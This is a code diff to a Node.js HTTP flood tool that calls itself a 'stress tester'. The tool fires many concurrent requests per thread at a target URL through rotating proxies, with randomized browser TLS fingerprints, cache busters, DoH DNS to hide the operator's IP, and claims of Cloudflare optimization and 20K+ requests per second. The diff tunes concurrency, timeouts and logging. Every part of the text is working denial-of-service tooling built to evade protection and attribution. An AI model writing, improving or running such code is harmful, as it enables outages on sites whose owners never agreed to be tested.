@@ -15,11 +15,11 @@ const { URL } = require('url');
 
 const BANNER = `
 ╔══════════════════════════════════════════════════════════╗
-║    ADVANCED STRESS TESTER V5.0 - ULTRA EDITION          ║
-║    HTTP/2 + Connection Pooling + Zero IP Leak           ║
-║    ✓ HTTP/2 Multiplexing   ✓ Smart Proxy Health         ║
-║    ✓ DoH DNS Resolution    ✓ Connection Reuse           ║
-║    ✓ JA3 Randomization     ✓ Ultra-High RPS             ║
+║    ADVANCED STRESS TESTER V5.2 - ULTRA FAST             ║
+║    Unlimited Sockets + Zero IP Leak + CF Optimized       ║
+║    ✓ 6 Concurrent/Thread   ✓ Smart Proxy Health         ║
+║    ✓ DoH DNS Resolution    ✓ Connection Pooling         ║
+║    ✓ JA3 Randomization     ✓ 20K+ RPS Capable           ║
 ╚══════════════════════════════════════════════════════════╝
 `;
 
@@ -221,10 +221,10 @@ function createTLSAgent(profile, proxyUrl = null) {
         honorCipherOrder: true,
         sessionTimeout: 300,
         keepAlive: true,
-        keepAliveMsecs: 5000,
+        keepAliveMsecs: 1000,
         maxSockets: Infinity,
-        maxFreeSockets: 256,
-        timeout: 10000,
+        maxFreeSockets: 10,
+        timeout: 5000,
         scheduling: 'fifo'
     };
     
@@ -589,13 +589,13 @@ class HTTPFlood {
         console.log(`[*] Target: ${this.url}`);
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
-        console.log(`[*] Mode: ULTRA-ADVANCED (5 concurrent/thread + HTTP/2)`);
+        console.log(`[*] Mode: ULTRA-FAST (6 concurrent/thread)`);
         console.log(`[*] JA3: Valid browser fingerprints + randomization`);
-        console.log(`[*] Protocol: HTTP/1.1 + HTTP/2 multiplexing (70%)`);
-        console.log(`[*] Connection: Pooled + Keep-Alive + Reuse`);
+        console.log(`[*] Protocol: Optimized HTTP/1.1 (3000ms timeout)`);
+        console.log(`[*] Connection: Unlimited sockets + Keep-Alive`);
         console.log(`[*] IP Leak: DoH DNS + Proxy health monitoring`);
         
-        const estimatedRPS = this.threads * 500;
+        const estimatedRPS = this.threads * 200;
         console.log(`[*] Estimated throughput: ${estimatedRPS}-${estimatedRPS * 3} req/s`);
         
         if (this.useOrigin && this.domain) {
@@ -604,6 +604,7 @@ class HTTPFlood {
         
         if (config.proxies.length > 0) {
             console.log(`[*] Using ${config.proxies.length} proxies with rotation`);
+            console.log(`[!] Enable debug mode to see first requests and errors`);
             config.workingProxies.clear();
         } else {
             console.log('[!] WARNING: Direct connection - your IP is visible!');
@@ -616,7 +617,6 @@ class HTTPFlood {
     async worker(threadId) {
         let currentProxy = config.proxies.length > 0 ? getHealthyProxy() : null;
         let localCount = 0;
-        const useHTTP2 = Math.random() > 0.3;
         
         const profile = getRandomElement(BROWSER_PROFILES);
         let cachedAgent = createTLSAgent(profile, currentProxy);
@@ -624,7 +624,7 @@ class HTTPFlood {
         const endTime = Date.now() + this.duration * 1000;
         
         while (this.running && Date.now() < endTime) {
-            const concurrent = config.proxies.length > 0 ? 5 : 3;
+            const concurrent = 6;
             const requests = [];
             
             for (let i = 0; i < concurrent; i++) {
@@ -645,76 +645,45 @@ class HTTPFlood {
                         
                         targetUrl = addCacheBuster(targetUrl);
                         
-                        if (useHTTP2 && targetUrl.startsWith('https') && Math.random() > 0.5) {
-                            try {
-                                const session = await createHTTP2Session(targetUrl, currentProxy);
-                                const req = session.request({
-                                    ':method': this.method,
-                                    ':path': new URL(targetUrl).pathname + new URL(targetUrl).search,
-                                    ...headers
-                                });
-                                
-                                req.setEncoding('utf8');
-                                let data = '';
-                                req.on('data', (chunk) => { data += chunk; });
-                                
-                                await new Promise((resolve, reject) => {
-                                    req.on('end', () => resolve());
-                                    req.on('error', reject);
-                                    req.setTimeout(1200, () => {
-                                        req.close();
-                                        resolve();
-                                    });
-                                });
-                                
-                                const latency = Date.now() - startTime;
-                                updateStats(true, 200, JSON.stringify(headers).length, data.length);
-                                config.stats.http2Requests++;
-                                
-                                if (currentProxy) {
-                                    updateProxyHealth(currentProxy, true, latency);
-                                }
-                            } catch (http2Error) {
-                                throw http2Error;
-                            }
-                        } else {
-                            const axiosConfig = {
-                                method: this.method.toLowerCase(),
-                                url: targetUrl,
-                                headers,
-                                timeout: 1200,
-                                maxRedirects: 5,
-                                validateStatus: () => true,
-                                httpsAgent: cachedAgent,
-                                httpAgent: cachedAgent,
-                                proxy: false,
-                                decompress: false
-                            };
-                            
-                            if (this.method === 'POST') {
-                                axiosConfig.data = crypto.randomBytes(256).toString('hex');
-                            }
-                            
-                            const response = await axios(axiosConfig);
-                            const latency = Date.now() - startTime;
-                            
-                            const bytesSent = JSON.stringify(headers).length + (axiosConfig.data ? axiosConfig.data.length : 0);
-                            const bytesReceived = response.data ? String(response.data).length : 0;
-                            
-                            updateStats(true, response.status, bytesSent, bytesReceived);
-                            
-                            if (currentProxy) {
-                                updateProxyHealth(currentProxy, true, latency);
-                                if (localCount % 30 === 0) {
-                                    const proxyIP = currentProxy.replace(/^https?:\/\//, '').split(':')[0];
-                                    config.workingProxies.add(proxyIP);
-                                }
+                        const axiosConfig = {
+                            method: this.method.toLowerCase(),
+                            url: targetUrl,
+                            headers,
+                            timeout: 3000,
+                            maxRedirects: 5,
+                            validateStatus: () => true,
+                            httpsAgent: cachedAgent,
+                            httpAgent: cachedAgent,
+                            proxy: false,
+                            decompress: true
+                        };
+                        
+                        if (this.method === 'POST') {
+                            axiosConfig.data = { data: 'x'.repeat(500) };
+                        }
+                        
+                        const response = await axios(axiosConfig);
+                        const latency = Date.now() - startTime;
+                        
+                        const bytesSent = JSON.stringify(headers).length + (axiosConfig.data ? JSON.stringify(axiosConfig.data).length : 0);
+                        const bytesReceived = response.data ? String(response.data).length : 0;
+                        
+                        updateStats(true, response.status, bytesSent, bytesReceived);
+                        
+                        if (currentProxy) {
+                            updateProxyHealth(currentProxy, true, latency);
+                            if (localCount % 30 === 0) {
+                                const proxyIP = currentProxy.replace(/^https?:\/\//, '').split(':')[0];
+                                config.workingProxies.add(proxyIP);
                             }
                         }
                         
-                        if (config.debug && localCount % 250 === 0) {
-                            const proto = useHTTP2 ? 'HTTP/2' : 'HTTP/1.1';
-                            console.log(`[DEBUG] T${threadId}: ${proto} - ${profile.name} - Reuse: ${config.stats.connectionReuse}`);
+                        if (config.debug && localCount === 1) {
+                            console.log(`[DEBUG] T${threadId}: First request - Status: ${response.status} - Latency: ${latency}ms`);
+                        }
+                        
+                        if (config.debug && localCount % 500 === 0) {
+                            console.log(`[DEBUG] T${threadId}: ${response.status} - Reuse: ${config.stats.connectionReuse}`);
                         }
                         
                         localCount++;
@@ -733,8 +702,8 @@ class HTTPFlood {
                             }
                         }
                         
-                        if (config.debug && localCount % 100 === 0) {
-                            console.log(`[DEBUG] T${threadId}: ${error.code || error.message}`);
+                        if (config.debug && localCount <= 5) {
+                            console.log(`[DEBUG] T${threadId}: ERROR - ${error.code || error.message} - Proxy: ${currentProxy ? 'YES' : 'NO'}`);
                         }
                     }
                 })();
